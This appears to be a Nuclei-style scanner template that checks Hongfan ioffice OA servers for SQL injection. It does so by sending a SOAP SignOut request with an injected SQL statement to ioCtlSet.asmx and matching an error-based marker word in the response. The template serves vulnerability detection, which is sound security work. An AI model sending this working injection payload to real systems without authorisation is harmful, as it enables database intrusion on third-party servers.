id: ioffice-oa-sqli
info:
  author: Str1am
  name: "\u7EA2\u5E06 ioffice OA \u7CFB\u7EDFsql\u6CE8\u5165\u6F0F\u6D1E"
  severity: critical
  tags: oa,sqli
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - dilemma
  matchers-condition: and
  raw:
  - "POST /ioffice/prg/set/wss/ioCtlSet.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:\
    \ Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0\n\
    SOAPAction: http://tempuri.org/SignOut\nContent-Type: text/xml; charset=utf-8\n\
    \n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    \ xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
    >\n    <soap:Body>\n      <SignOut xmlns=\"http://tempuri.org/\">\n        <sql>select\
    \ convert(int,CHAR(100)+CHAR(105)+CHAR(108)+CHAR(101)+CHAR(109)+CHAR(109)+CHAR(97))\
    \ FROM syscolumns</sql>\n      </SignOut>\n    </soap:Body>\n  </soap:Envelope>\n"
